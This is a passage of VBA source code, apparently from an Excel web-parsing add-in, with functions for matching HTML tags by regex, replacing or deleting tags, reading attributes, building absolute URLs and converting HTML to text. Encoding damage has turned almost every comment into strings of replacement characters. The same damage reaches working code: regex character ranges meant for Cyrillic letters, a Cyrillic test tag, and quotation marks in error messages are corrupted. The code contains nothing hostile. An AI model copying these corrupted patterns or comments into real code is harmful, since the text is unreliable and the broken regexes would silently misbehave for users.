        If URL$ = "" Then Exit Function
    End If

    prefix$ = Trim(prefix$): If prefix$ = WEBSITE_URL_VARNAME$ Then prefix$ = ""

    If (Len(prefix$) > 0) And (Not IsURL(URL$)) Then
        URL$ = AddPrefixBeforeURL(URL$, prefix$)

        '        If Len(Prefix$) - Len(Replace(Prefix$, "/", "")) < 3 Then
        '            If Not (Prefix$ Like "*?/") Then Prefix$ = Prefix$ & "/"
        '        End If
        '        If URL$ Like "/*" Then URL$ = Mid(URL$, 2)
        '        URL$ = Prefix$ & URL$
    End If

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If Len(Trim(URL_VarName$)) Then ParserVariables.item("%" & Trim(URL_VarName$) & "%") = URL$
    If Len(Trim(Text_VarName$)) Then ParserVariables.item("%" & Trim(Text_VarName$) & "%") = Trim(ConvertHTMLtoText(txt$))

    GetHyperlinkAndText = URL$
End Function


Function ReplaceTags(ByVal txt$, ByVal Tag$, ByVal ReplaceType$, ByVal ReplacePattern$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Tag$ - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| div id=content |fffd||fffd||fffd| id=content |fffd||fffd||fffd| div |fffd||fffd||fffd| attr=attrvalue |fffd||fffd||fffd| div =AttributePattern
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Result$ - |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  ReplaceInnerHTML, AddBeforeInnerHTML, AddAfterInnerHTML
    '                                      ReplaceOuterHTML,  AddBeforeOuterHTML, AddAfterOuterHTML
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Pattern$ |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| [=text] |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| ConvertToText),
    ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| [attr] |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| attr

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ReplaceOuterHTML)
    On Error Resume Next

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Tag$ - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| TagName$, AttrName$, AttrValue$
    Dim TagName$, AttrName$, AttrValue$
    Tag$ = Application.Trim(Tag$)
    AttrName$ = Split(Tag$, "=")(0)
    AttrValue$ = Trim(Split(Tag$, "=", 2)(1))

    If InStr(1, AttrName$, " ") = 0 Then
        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd| TagName$(|fffd||fffd||fffd||fffd| AttrValue$="") |fffd||fffd||fffd| AttrName$ (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| AttrValue$)
        If Len(AttrValue$) = 0 Then TagName$ = AttrName$: AttrName$ = "" Else TagName$ = "any tag"
    Else
        TagName$ = Split(AttrName$, " ")(0)
        AttrName$ = Trim(Split(AttrName$, " ", 2)(1))
        If AttrName$ = "" Then AttrName$ = "AttributesPattern"
    End If
    ' Debug.Print "TagName=""" & TagName & """", "AttrName=""" & AttrName & """", "AttrValue=""" & AttrValue & """"

    ReplaceTags = GetTags(txt$, TagName$, AttrName$, AttrValue$, "REPLACE", ReplaceType$, ReplacePattern$)
End Function

Function GetTags(ByVal txt$, ByVal TagName$, Optional ByVal AttrName$, Optional ByVal AttrValue$, Optional ByVal result$ = "outerHTML", _
                 Optional ByVal ReplaceType$, Optional ByVal ReplacePattern$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim res$, Pattern$, SelfClosing As Boolean, NeedContent As Boolean, ResultType$, ResultIndex$, ResultsCount&, ind&
    Dim PatternPrefix$, PatternSuffix$, AttrValuePattern$, Add_URL_Prefix$
    Const SelfClosingTags = ",area,base,basefont,br,col,frame,hr,img,input,isindex,link,meta,param,embed,"
    Const ASTERISK_PATTERN = "[A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|0-9_-]*"
    AttrName$ = Trim(AttrName$): AttrValue$ = Trim(AttrValue$): TagName$ = Trim(TagName$)
    If TagName$ = "Any Tag" Then TagName$ = "[a-zA-Z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|1-6]+"
    If TagName$ = "" Then GetTags = "GetTags ERROR: 'TagName' parameter is blank": Exit Function

    If InStr(1, AttrValue$, "*") Then
        If AttrValue$ Like "[*]*" Then AttrValue$ = ASTERISK_PATTERN & Mid(AttrValue$, 2)
        If AttrValue$ Like "*[A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|0-9_-][*]" Then AttrValue$ = Left(AttrValue$, Len(AttrValue$) - 1) & ASTERISK_PATTERN
    End If

    PatternPrefix$ = "<(" & TagName$ & ")\b"
    PatternSuffix$ = "[^>]*>"

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 15 |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2018, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| regexp |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If AscW(Left(TagName$, 1)) > 127 Then PatternPrefix$ = "<(" & TagName$ & ")( |>)"

    Select Case True
        Case AttrName$ & AttrValue$ = ""        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Pattern$ = PatternPrefix$ & PatternSuffix$

        Case AttrName$ = "AttributesPattern"        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| regexp |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If InStr(1, AttrValue$, ">") + InStr(1, AttrValue$, "<") Then _
               GetTags = "GetTags ERROR: 'AttributeValue' parameter contains unacceptable symbols ('<' or '>')": Exit Function
            Pattern$ = PatternPrefix$ & "[^>]*" & AttrValue$ & PatternSuffix$

        Case Else        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| name / id / class
            AttrValuePattern$ = "(?:(?:" & AttrValue$ & "\b)|(?:['""](|[^<>'""]* )\b" & AttrValue$ & "\b(| [^<>'""]*)['""]))"
            Pattern$ = PatternPrefix$ & "[^>]*\b" & AttrName$ & "\s*=\s*" & AttrValuePattern$ & PatternSuffix$
    End Select

    result$ = Application.Trim(result$): If result$ = "" Then GetTags = "GetTags ERROR: 'Result' parameter is blank": Exit Function
    ResultType$ = Split(result$)(0)
    ResultIndex$ = Split(result$, , 2)(1)

    If ResultType$ Like "*_with_prefix" Then
        ResultType$ = Split(ResultType$, "_with_")(0): Add_URL_Prefix$ = Trim(Render(WEBSITE_URL_VARNAME$))
        If Add_URL_Prefix$ = WEBSITE_URL_VARNAME$ Then Add_URL_Prefix$ = ""
    End If

    SelfClosing = SelfClosingTags Like "*," & TagName$ & ",*"
    NeedContent = InStr(1, "|innerHTML|outerHTML|ConvertToText|URL|Text|DeleteTags|ReplaceTagWithItsText|REPLACE|", "|" & ResultType$ & "|") > 0
    'If (Not NeedContent) And (ResultIndex$ <> "") Then GetTags = "GetTags ERROR: Unsupported 'Result' parameter ('item index' is available for 'innerHTML'/'outerHTML'/'text' result types only)": Exit Function

    Dim v, Content$, cnt&, i&, TextAfterHeader$, TagHeader$, TagFooter$, TagContent$, attr$, txtlen&, NN&, SourceTXT$
    If ResultType$ = "REPLACE" Then SourceTXT$ = txt

    With REGEXP
StartSearching:
        .IgnoreCase = True: .Pattern = Pattern$
        If .test(txt) Then
            For Each v In .Execute(txt)
                DoEvents
                NN& = NN& + 1
                'If NN& Mod 50 = 0 Then Debug.Print "NN&=" & NN&
                TagHeader$ = "": TagHeader$ = v.value
                'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd|" & TagHeader$ & "|fffd|", v.FirstIndex

                If NeedContent And Not SelfClosing Then
                    TagName$ = v.submatches.item(0)
                    TextAfterHeader$ = "": TextAfterHeader$ = Mid(txt, v.FirstIndex + Len(TagHeader$) + 1)

                    TagContent$ = GetTagInnerHTML(TextAfterHeader$, TagName$)
                    TagFooter$ = "</" & TagName$ & ">"
                    If (ResultType$ = "outerHTML") Or (ResultType$ = "REPLACE") Or (ResultType$ = "URL|Text") _
                       Or (ResultType$ = "DeleteTags") Or (ResultType$ = "ReplaceTagWithItsText") Then
                        Content$ = TagHeader$ & TagContent$ & TagFooter$
                    Else
                        Content$ = TagContent$
                    End If
                Else
                    Content$ = TagHeader$
                    TagContent$ = "": TagFooter$ = ""
                End If

                Select Case ResultType$
                    Case "innerHTML", "outerHTML", "TagHeaderOnly"        ' do nothing

                    Case "REPLACE"        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ReplaceTags
                        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: ReplaceType$, ReplacePattern$
                        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: txt, TagHeader$, TagFooter$, TagContent$, content$ ( = TagHeader$ & TagContent$ & TagFooter$)
                        Dim ReplacementText$, m, code$, r$
                        ReplacementText$ = ReplacePattern$: txtlen& = Len(txt)

                        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        .IgnoreCase = True: .Pattern = "\[([^\]\[]+)\]"
                        If .test(ReplacementText$) Then
                            For Each m In .Execute(ReplacementText$)
                                code$ = m.submatches.item(0)
                                Select Case code$
                                    Case "=text": r$ = ConvertHTMLtoText(TagContent$)
                                    Case "=inner": r$ = TagContent$
                                    Case Else: r$ = GetAttributeFromTag(TagHeader$, code$)
                                End Select
                                ReplacementText$ = Replace(ReplacementText$, m, r$, , , vbTextCompare)
                            Next m
                        End If
                        ' MsgBox ReplacementText$, vbCritical, ReplaceType$
                        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

                        Select Case ReplaceType$
                            Case "GetInnerHTML": SourceTXT$ = Replace(SourceTXT$, Content$, TagContent$)
                            Case "ReplaceInnerHTML": SourceTXT$ = Replace(SourceTXT$, Content$, TagHeader$ & ReplacementText$ & TagFooter$)
                            Case "AddBeforeInnerHTML": SourceTXT$ = Replace(SourceTXT$, Content$, TagHeader$ & ReplacementText$ & TagContent$ & TagFooter$)
                            Case "AddAfterInnerHTML": SourceTXT$ = Replace(SourceTXT$, Content$, TagHeader$ & TagContent$ & ReplacementText$ & TagFooter$)
                            Case "ReplaceOuterHTML": SourceTXT$ = Replace(SourceTXT$, Content$, ReplacementText$)
                            Case "AddBeforeOuterHTML": SourceTXT$ = Replace(SourceTXT$, Content$, ReplacementText$ & TagHeader$ & TagContent$ & TagFooter$)
                            Case "AddAfterOuterHTML": SourceTXT$ = Replace(SourceTXT$, Content$, TagHeader$ & TagContent$ & TagFooter$ & ReplacementText$)
                            Case Else: GetTags = "ReplaceTags ERROR: unsupported 'ReplaceType' parameter |fffd|" & ReplaceType$ & "|fffd|": Exit Function
                        End Select
                        'Static NNN: NNN = NNN + 1: If NNN > 10 Then Stop
                        Content$ = ""        ': If Len(txt) <> txtlen& Then GoTo StartSearching

                    Case "DeleteTags"
                        txtlen& = Len(txt): txt = Replace(txt, Content$, "")
                        Content$ = "": If Len(txt) < txtlen& Then GoTo StartSearching        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

                    Case "ReplaceTagWithItsText"
                        txtlen& = Len(txt): txt = Replace(txt, Content$, ConvertHTMLtoText(Content$))
                        Content$ = "": If Len(txt) < txtlen& Then GoTo StartSearching        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

                    Case "ConvertToText"        ' convert to text
                        Content$ = ConvertHTMLtoText(Content$)

                    Case "URL|Text"
                        Add_URL_Prefix$ = Trim(Render(WEBSITE_URL_VARNAME$)): If Add_URL_Prefix$ = WEBSITE_URL_VARNAME$ Then Add_URL_Prefix$ = ""
                        Dim URL$: URL$ = GetAttributeFromTag(Content$, "href")
                        
                        If Len(Add_URL_Prefix$) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| "href_with_prefix"
                            If Not IsURL(URL$) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| http)
                                If Add_URL_Prefix$ Like "*?/" Then Add_URL_Prefix$ = Left(Add_URL_Prefix$, Len(Add_URL_Prefix$) - 1)
                                If Left(URL$, 1) = "?" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                    Add_URL_Prefix$ = Split(LAST_USED_URL$, "?")(0)
                                    URL$ = Add_URL_Prefix$ & URL$
                                Else
                                    URL$ = AddPrefixBeforeURL(URL$, Add_URL_Prefix$)
                                End If
                            End If
                        End If
                        Content$ = URL$ & "|" & RealTrim(ConvertHTMLtoText(Content$), " ", " ")

                    Case Else        ' get attribute value
                        Content$ = GetAttributeFromTag(Content$, ResultType$)

                        If Len(Add_URL_Prefix$) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| "href_with_prefix"
                            If Not IsURL(Content$) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| http)
                                If Add_URL_Prefix$ Like "*?/" Then Add_URL_Prefix$ = Left(Add_URL_Prefix$, Len(Add_URL_Prefix$) - 1)
                                If Left(Content$, 1) = "?" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                                    Add_URL_Prefix$ = Split(LAST_USED_URL$, "?")(0)
                                    Content$ = Add_URL_Prefix$ & Content$
                                Else
                                    Content$ = AddPrefixBeforeURL(Content$, Add_URL_Prefix$)
                                End If
                            End If
                        End If
                End Select

                If Len(Content$) Then
                    ResultsCount& = ResultsCount& + 1
                    GetTags = GetTags & IIf(Len(GetTags), ARSEP, "") & Content$
                    If Val(ResultIndex$) Then If Val(ResultIndex$) = ResultsCount& Then GetTags = Content$: Exit Function
                End If
            Next v
        End If
    End With

    If (ResultType$ = "DeleteTags") Or (ResultType$ = "ReplaceTagWithItsText") Then GetTags = txt: Exit Function
    If ResultType$ = "REPLACE" Then GetTags = SourceTXT$: Exit Function

    If ResultIndex$ = "join" Then GetTags = Replace(GetTags, ARSEP, vbNewLine): Exit Function

    If Len(ResultIndex$) * Len(GetTags) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If InStr(1, ResultIndex$, "last", vbTextCompare) > 0 Then
            ind& = UBound(Split(GetTags, ARSEP)) + Val(Split(ResultIndex$, "last")(1))
        Else
            ind& = Fix(Val(ResultIndex$)) - 1
        End If

        If ind& >= 0 And ind& <= UBound(Split(GetTags, ARSEP)) Then
            GetTags = Split(GetTags, ARSEP)(ind&)
        Else
            GetTags = ""
        End If
    End If
End Function


Private Sub test12123()
    Dim txt$, v, Pattern$
    txt$ = "<b><|fffd||fffd||fffd| href='' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|='&#x41E;&#x411;&#x429;&#x415;&#x421;'></|fffd||fffd||fffd|></b>"
    Pattern$ = "<(|fffd||fffd||fffd|)\b[^>]*>"

    Pattern$ = "<(|fffd||fffd||fffd|)( |>)[^>]*>"


    With REGEXP
        .IgnoreCase = True: .Pattern = Pattern$
        If .test(txt) Then
            For Each v In .Execute(txt)
                Debug.Print v
            Next
        Else
            Debug.Print "not found"
        End If
    End With
End Sub

Function AddPrefixBeforeURL(ByVal URL$, ByVal prefix$) As String
    On Error Resume Next
    If prefix$ Like "*?/" Then prefix$ = Left(prefix$, Len(prefix$) - 1)
    If URL$ Like "//*" Then
        Dim Protocol_Prefix$
        Protocol_Prefix$ = Split(prefix$, "//")(0)
        If Protocol_Prefix$ = "" Then Protocol_Prefix$ = "http:"
        AddPrefixBeforeURL = Protocol_Prefix$ & URL$
    ElseIf URL$ Like "/*" Then
        AddPrefixBeforeURL = GetBaseURL(prefix$) & URL$
    Else
        AddPrefixBeforeURL = prefix$ & "/" & URL$
    End If
End Function

Function GetAttributeFromTag(ByVal Content$, ByVal AttrName$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML |fffd||fffd||fffd||fffd| content$
    On Error Resume Next: Dim attr$
    attr$ = "": Content$ = Split(Content$, ">")(0)
    Content$ = Replace(Replace(Replace(Content$, "= ", "="), " =", "="), vbTab, " ")
    attr$ = Trim(Split(Content$, " " & AttrName$ & "=", 2)(1))
    Select Case Mid(attr$, 1, 1)
        Case """", "'": attr$ = Split(attr$, Mid(attr$, 1, 1))(1)
        Case Else: attr$ = Split(attr$, " ")(0)
    End Select
    GetAttributeFromTag = ReplaceNamedCharacters(attr$)        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|  &amp; |fffd||fffd| & (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
End Function

Function GetTagInnerHTML(ByVal txt$, ByVal TagName$) As String
    On Error Resume Next
    Dim ClosingTag$, arr, i&, nOPENING&
    ClosingTag$ = "</" & TagName$ & ">"
    If InStr(1, txt, ClosingTag$, vbTextCompare) = 0 Then Exit Function
    arr = Split(txt, ClosingTag$, , vbTextCompare)
    For i = LBound(arr) To UBound(arr) - 1        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| -1, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| txt$)
        If Len(arr(i)) Then
            nOPENING& = nOPENING& + UBound(Split(arr(i), "<" & TagName$ & ">")) + UBound(Split(arr(i), "<" & TagName$ & " "))
        End If
        GetTagInnerHTML = GetTagInnerHTML & arr(i) & IIf(nOPENING& <> i, ClosingTag$, "")
        If nOPENING& = i Then Exit Function
    Next i
    GetTagInnerHTML = ""
End Function

Function ReplaceNamedCharacters(ByVal txt$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ConvertHTMLtoText, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim char

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If txt Like "*&*;*" Then
        For Each char In Split(HTML_SP$, ";")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &|fffd|opy; |fffd| &nbs|fffd|;
            If InStr(1, txt$, Split(char, "=")(0), vbBinaryCompare) Then
                txt$ = Replace(txt$, "&" & Split(char, "=")(0) & ";", ChrW(Val(Split(char, "=")(1))), , , vbBinaryCompare)
            End If
        Next char
    End If

    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &#84l0;
    If InStr(1, txt, "*&*;*") > 0 Then
        With REGEXP
            .Pattern = "&#(\d{2,5});"
            If .test(txt$) Then
                For Each char In .Execute(txt)
                    txt$ = Replace(txt$, char.value, ChrW(Val(char.submatches.item(0))))
                Next
            End If
        End With
    End If
    ReplaceNamedCharacters = txt
End Function

Function ConvertHTMLtoText(ByVal txt$, Optional RemoveExtraLF As Boolean = False) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DOM
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MSHTML
    On Error Resume Next
    Const ADD_TAB$ = "</th><th>,</td><td>,</dt>"
    Const ADD_NL$ = "<div>,<p>,<table>,</table>,<img>,<h1>,<h2>,<h3>,<h4>,<h5>,<h6>,<br>,<hr>,</tr>,</li>,<dl>,<dt>"

    If Left(txt, 9) = "<![CDATA[" Then If Right(txt, 3) = "]]>" Then ConvertHTMLtoText = Mid(txt, 10, Len(txt) - 12): Exit Function

    Dim Tag, char, arr, cnt&, i&
    With REGEXP

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML
        If txt$ Like "*<!--*-->*" Then
            arr = "": arr = Split(txt, "<!--")
            For i = LBound(arr) + 1 To UBound(arr)
                cnt& = 0: cnt& = UBound(Split(arr(i), "-->"))
                If cnt& = 0 Then arr(i) = "" Else arr(i) = Split(arr(i), "-->")(cnt&)
            Next i
            txt = Join(arr, "")
        End If

        txt$ = CloseUnclosedTags(txt$)
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        .Pattern = "(<[A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|1-6]+)[^<>]*(>)"
        txt$ = .Replace(txt$, "$1$2")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
        .Pattern = ">\s*<"
        txt$ = .Replace(txt$, "><")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If txt$ Like "*<script>*</script>*" Then
            arr = "": arr = Split(txt, "<script>")
            For i = LBound(arr) + 1 To UBound(arr)
                cnt& = 0: cnt& = UBound(Split(arr(i), "</script>"))
                If cnt& = 0 Then arr(i) = "" Else arr(i) = Split(arr(i), "</script>")(cnt&)
            Next i
            txt = Join(arr, "")
        End If

        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <body>
        If txt Like "*<body>*" Then txt = Split(txt, "<body>")(1)

